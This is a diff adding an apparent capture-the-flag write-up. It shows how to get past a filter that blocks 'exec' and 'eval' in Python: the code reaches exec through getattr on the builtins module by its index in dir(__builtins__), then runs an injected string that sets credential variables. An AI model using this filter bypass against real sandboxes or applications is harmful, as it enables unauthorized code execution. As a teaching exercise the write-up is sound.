@@ -1,0 +1,42 @@
+In This Part We Can Not Easily Use exec And eval Function Or Anything That Contains exec And eval.
+It Lookes Thats Really Hard :D
+
+As I Said In Hint File, `Need To Know About "__builtins__","getattr" function,"dir" function and "builtins" module...`
+
+So What Are These ? In __builtins__ You Have Access To All Functions That Are Built In In Python. And As 
+You Know eval And Exec Are Builtin Function :)
+
+Time To Open You Python Interpreter :)
+
+Type This Commands Lines And See The Results Line By Line :
+
+```
+* __builtins__
+
+* dir(__builtins__) # Now Try To Find "exec" And "eval" Functions In This Module.
+
+* dir(__builtins__).index("exec") # Important : This May Not Be Index That You Want To Use.
+
+* dir(__builtins__)[102] # (102 Is index for example) Now We Find String 'exec' In This Module. Time To Get Function :)
+
+* __import__('builtins') # In This Module You Can Get Builtin Functions.
+
+* getattr(__import__('builtins'),dir(__builtins__)[102]) # Now You Get The exec Function Successfully !
+
+* getattr(__import__('builtins'),dir(__builtins__)[102])("username='pwnninja';password='s3cr3t'") # Now You're Done !
+```
+
+#############################################################################################
+#                                     To Get Right Index                                    #
+
+If You Want Right Index To Use It, Add This Line To The End Of Config File Then Run It :
+
+```
+print(dir(__builtins__)[100:130])
+```
+
+And Play With Range Until You Find Index Of exec Function.
+I Found exec Function At Index 104 in interpreter and found 102 in script.
+
+#                                     To Get Right Index                                    #
+#############################################################################################
